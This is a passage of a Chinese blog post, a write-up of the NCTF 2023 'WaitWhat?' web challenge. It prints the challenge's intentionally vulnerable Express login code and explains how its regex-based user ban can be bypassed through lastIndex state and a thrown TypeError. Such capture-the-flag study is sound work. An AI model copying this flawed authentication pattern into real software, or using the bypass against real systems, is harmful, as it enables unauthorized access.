@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="质量很高的比赛，收获满满">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NCTF 2023">
+<meta property="og:url" content="https://sun-zzz.github.io/article/NCTF2023.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="质量很高的比赛，收获满满">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20240401201000544.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20240401201015290.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20240401201030505.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20240401201126614.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20240401201220929.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20240401201235782.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20240401201246801.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20240401201329986.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20231229143529891.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20231229140607931.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20231229143821345.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20231229201808140.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20231229201102713.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20231229201131924.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20231229201213786.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20231229201305498.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20231229201648495.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20231229201621224.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20240401201433227.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20240401201504690.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20240401201553160.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20240401201614723.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20240401201639360.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20240401201711511.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20240401201729069.png">
+<meta property="article:published_time" content="2023-12-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-06-23T13:49:27.977Z">
+<meta property="article:author" content="rev1ve">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/NCTF2023/image-20240401201000544.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/NCTF2023.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>NCTF 2023 | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/NCTF2023.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          NCTF 2023
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-12-31 00:00:00" itemprop="dateCreated datePublished" datetime="2023-12-31T00:00:00+08:00">2023-12-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-06-23 21:49:27" itemprop="dateModified" datetime="2024-06-23T21:49:27+08:00">2024-06-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/NCTF2023.html" class="post-meta-item leancloud_visitors" data-flag-title="NCTF 2023" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/NCTF2023.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/NCTF2023.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>质量很高的比赛，收获满满</p>
+<span id="more"></span>
+
+<h1 id="NCTF-2023-web解析"><a href="#NCTF-2023-web解析" class="headerlink" title="[NCTF 2023]web解析"></a>[NCTF 2023]web解析</h1><h2 id="WaitWhat"><a href="#WaitWhat" class="headerlink" title="WaitWhat?"></a>WaitWhat?</h2><p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const child_process = require(&#x27;child_process&#x27;)</span><br><span class="line">const app = express()</span><br><span class="line">app.use(express.json())</span><br><span class="line">const port = 80</span><br><span class="line"></span><br><span class="line">function escapeRegExp(string) &#123;</span><br><span class="line">    return string.replace(/[.*+?^$&#123;&#125;()|[\]\\]/g, &#x27;\\$&amp;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let users = &#123;</span><br><span class="line">    &quot;admin&quot;: &quot;admin&quot;,</span><br><span class="line">    &quot;user&quot;: &quot;user&quot;,</span><br><span class="line">    &quot;guest&quot;: &quot;guest&quot;,</span><br><span class="line">    &#x27;hacker&#x27;:&#x27;hacker&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let banned_users = [&#x27;hacker&#x27;]</span><br><span class="line"></span><br><span class="line">// 你不准getflag</span><br><span class="line">banned_users.push(&quot;admin&quot;)</span><br><span class="line"></span><br><span class="line">let banned_users_regex = null;</span><br><span class="line">function build_banned_users_regex() &#123;</span><br><span class="line">	let regex_string = &quot;&quot;</span><br><span class="line">    for (let username of banned_users) &#123;</span><br><span class="line">        regex_string += &quot;^&quot; + escapeRegExp(username) + &quot;$&quot; + &quot;|&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    regex_string = regex_string.substring(0, regex_string.length - 1)</span><br><span class="line">    banned_users_regex = new RegExp(regex_string, &quot;g&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//鉴权中间件</span><br><span class="line">function requireLogin(req, res, next) &#123;</span><br><span class="line">    let username = req.body.username</span><br><span class="line">    let password = req.body.password</span><br><span class="line">    if (!username || !password) &#123;</span><br><span class="line">        res.send(&quot;用户名或密码不能为空&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    if (typeof username !== &quot;string&quot; || typeof password !== &quot;string&quot;) &#123;</span><br><span class="line">        res.send(&quot;用户名或密码不合法&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    // 基于正则技术的封禁用户匹配系统的设计与实现</span><br><span class="line">    let test1 = banned_users_regex.test(username)</span><br><span class="line">    console.log(`使用正则$&#123;banned_users_regex&#125;匹配$&#123;username&#125;的结果为：$&#123;test1&#125;`)</span><br><span class="line">    if (test1) &#123;</span><br><span class="line">		console.log(&quot;第一个判断匹配到封禁用户：&quot;,username)</span><br><span class="line">        res.send(&quot;用户&#x27;&quot;+username + &quot;&#x27;被封禁，无法鉴权！&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    // 基于in关键字的封禁用户匹配系统的设计与实现</span><br><span class="line">    let test2 = (username in banned_users)</span><br><span class="line">    console.log(`使用in关键字匹配$&#123;username&#125;的结果为：$&#123;test2&#125;`)</span><br><span class="line">    if (test2)&#123;</span><br><span class="line">        console.log(&quot;第二个判断匹配到封禁用户：&quot;,username)</span><br><span class="line">        res.send(&quot;用户&#x27;&quot;+username + &quot;&#x27;被封禁，无法鉴权！&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    if (username in users &amp;&amp; users[username] === password) &#123;</span><br><span class="line">        next()</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    res.send(&quot;用户名或密码错误，鉴权失败！&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function registerUser(username, password) &#123;</span><br><span class="line">    if (typeof username !== &quot;string&quot; || username.length &gt; 20) &#123;</span><br><span class="line">        return &quot;用户名不合法&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if (typeof password !== &quot;string&quot; || password.length &gt; 20) &#123;</span><br><span class="line">        return &quot;密码不合法&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if (username in users) &#123;</span><br><span class="line">        return &quot;用户已存在&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(let existing_user in users)&#123;</span><br><span class="line">        let existing_user_password = users[existing_user]</span><br><span class="line">        if (existing_user_password === password)&#123;</span><br><span class="line">            return `您的密码已经被用户&#x27;$&#123;existing_user&#125;&#x27;使用了，请使用其它的密码`</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    users[username] = password</span><br><span class="line">    return &quot;注册成功&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(express.static(&#x27;public&#x27;))</span><br><span class="line"></span><br><span class="line">// 每次请求前，更新封禁用户正则信息</span><br><span class="line">app.use(function (req, res, next) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        build_banned_users_regex()</span><br><span class="line">		console.log(&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;,banned_users_regex)</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(&quot;/api/register&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    let username = req.body.username</span><br><span class="line">    let password = req.body.password</span><br><span class="line">    let message = registerUser(username, password)</span><br><span class="line">    res.send(message)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(&quot;/api/login&quot;, requireLogin, (req, res) =&gt; &#123;</span><br><span class="line">    res.send(&quot;登录成功！&quot;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(&quot;/api/flag&quot;, requireLogin, (req, res) =&gt; &#123;</span><br><span class="line">    let username = req.body.username</span><br><span class="line">    if (username !== &quot;admin&quot;) &#123;</span><br><span class="line">        res.send(&quot;登录成功，但是只有&#x27;admin&#x27;用户可以看到flag，你的用户名是&#x27;&quot; + username + &quot;&#x27;&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    let flag = child_process.execSync(&quot;cat flag&quot;).toString()</span><br><span class="line">    res.end(flag)</span><br><span class="line">    console.error(&quot;有人获取到了flag！为了保证题目的正常运行，将会重置靶机环境！&quot;)</span><br><span class="line">    res.on(&quot;finish&quot;, () =&gt; &#123;</span><br><span class="line">        setTimeout(() =&gt; &#123; process.exit(0) &#125;, 1)</span><br><span class="line">    &#125;)</span><br><span class="line">    return</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/api/ban_user&#x27;, requireLogin, (req, res) =&gt; &#123;</span><br><span class="line">    let username = req.body.username</span><br><span class="line">    let ban_username = req.body.ban_username</span><br><span class="line">    if(!ban_username)&#123;</span><br><span class="line">        res.send(&quot;ban_username不能为空&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    if(username === ban_username)&#123;</span><br><span class="line">        res.send(&quot;不能封禁自己&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    for (let name of banned_users)&#123;</span><br><span class="line">        if (name === ban_username) &#123;</span><br><span class="line">            res.send(&quot;用户已经被封禁&quot;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    banned_users.push(ban_username)</span><br><span class="line">    res.send(&quot;封禁成功！&quot;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    res.redirect(&quot;/static/index.html&quot;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">    console.log(`listening on port $&#123;port&#125;`)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>代码很长我们分析一下：</p>
+<p>首先定义escapeRegExp函数去进行转义，给了user数组包含四个用户和对应密码，然后定义banned_users数组并随后通过push添加admin用户为黑名单</p>
+<p>然后看向build_banned_users_regex()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let banned_users_regex = null;</span><br><span class="line">function build_banned_users_regex() &#123;</span><br><span class="line">	let regex_string = &quot;&quot;</span><br><span class="line">    for (let username of banned_users) &#123;</span><br><span class="line">        regex_string += &quot;^&quot; + escapeRegExp(username) + &quot;$&quot; + &quot;|&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    regex_string = regex_string.substring(0, regex_string.length - 1)</span><br><span class="line">    banned_users_regex = new RegExp(regex_string, &quot;g&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对传入的username进行正则匹配，然后截断也就是<code>/^admin$/</code>，最后启用了参数g</p>
+<p>和它有关的是<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastIndex">lastIndex</a>属性</p>
+<p><strong>RegExp.lastIndex</strong></p>
+<blockquote>
+<p><code>lastIndex</code> 是正则表达式的一个可读可写的整型属性，用来指定下一次匹配的起始索引。</p>
+</blockquote>
+<p>只有正则表达式使用了表示全局检索的 “<code>g</code>“ 或者粘性检索的 “<code>y</code>“ 标志时，该属性才会起作用。此时应用下面的规则：</p>
+<ul>
+<li>如果 <code>lastIndex</code> 大于字符串的长度，则 <code>regexp.test</code> 和 <code>regexp.exec</code> 将会匹配失败，然后 <code>lastIndex</code> 被设置为 0。</li>
+<li>如果 <code>lastIndex</code> 等于或小于字符串的长度，则该正则表达式匹配从 <code>lastIndex</code> 位置开始的字符串。    <ul>
+<li>如果 <code>regexp.test</code> 和 <code>regexp.exec</code> 匹配成功，<code>lastIndex</code> 会被设置为紧随最近一次成功匹配的下一个位置。</li>
+<li>如果 <code>regexp.test</code> 和 <code>regexp.exec</code> 匹配失败，<code>lastIndex</code> 会被设置为 0</li>
+</ul>
+</li>
+</ul>
+<p>我们本地测试下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var re = /^admin$/g;</span><br><span class="line">console.log(re.test(&#x27;admin&#x27;))</span><br><span class="line">console.log(&quot;第一次：&quot;+re.lastIndex)</span><br><span class="line">console.log(re.test(&#x27;admin&#x27;))</span><br><span class="line">console.log(&quot;第二次：&quot;+re.lastIndex)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<p><img src="/article/NCTF2023/image-20240401201000544.png"></p>
+<p>不难发现如果正则表达式设置了全局标志， test() 的执行会改变正则表达式 lastIndex 属性。连续的执行 test() 方法，后续的执行将会从lastIndex处开始匹配字符串</p>
+<p>我们继续往下看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//鉴权中间件</span><br><span class="line">function requireLogin(req, res, next) &#123;</span><br><span class="line">    let username = req.body.username</span><br><span class="line">    let password = req.body.password</span><br><span class="line">    if (!username || !password) &#123;</span><br><span class="line">        res.send(&quot;用户名或密码不能为空&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    if (typeof username !== &quot;string&quot; || typeof password !== &quot;string&quot;) &#123;</span><br><span class="line">        res.send(&quot;用户名或密码不合法&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    // 基于正则技术的封禁用户匹配系统的设计与实现</span><br><span class="line">    let test1 = banned_users_regex.test(username)</span><br><span class="line">    console.log(`使用正则$&#123;banned_users_regex&#125;匹配$&#123;username&#125;的结果为：$&#123;test1&#125;`)</span><br><span class="line">    if (test1) &#123;</span><br><span class="line">		console.log(&quot;第一个判断匹配到封禁用户：&quot;,username)</span><br><span class="line">        res.send(&quot;用户&#x27;&quot;+username + &quot;&#x27;被封禁，无法鉴权！&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    // 基于in关键字的封禁用户匹配系统的设计与实现</span><br><span class="line">    let test2 = (username in banned_users)</span><br><span class="line">    console.log(`使用in关键字匹配$&#123;username&#125;的结果为：$&#123;test2&#125;`)</span><br><span class="line">    if (test2)&#123;</span><br><span class="line">        console.log(&quot;第二个判断匹配到封禁用户：&quot;,username)</span><br><span class="line">        res.send(&quot;用户&#x27;&quot;+username + &quot;&#x27;被封禁，无法鉴权！&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    if (username in users &amp;&amp; users[username] === password) &#123;</span><br><span class="line">        next()</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    res.send(&quot;用户名或密码错误，鉴权失败！&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>requireLogin()函数起到了鉴权作用，设置了两套waf，分别是正则技术和in关键字，要想登陆成功就必须绕过waf。</p>
+<p>第一个我们前文已经知道banned_users_regex()函数的具体执行过程，test()返回一个布尔值，由于我们刚刚测试过设置了全局标志，连续的执行 test() 方法会使其布尔值发生改变，我们往下看在app.use处发现会更新封禁用户正则信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 每次请求前，更新封禁用户正则信息</span><br><span class="line">app.use(function (req, res, next) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        build_banned_users_regex()</span><br><span class="line">		console.log(&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;,banned_users_regex)</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>我们要让其不更新正则信息利用test()多次执行返回false的布尔值绕过第一个waf，也就是说我们要抛出异常。</p>
+<p>我们注意到banned_users_regex()函数中escapeRegExp()定义的是接收string类型的，如果传递非字符串类型就可以实现抛出TypeError</p>
+<p>第二个waf根据注释是基于<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in">in关键字</a>我们来分析一下</p>
+<blockquote>
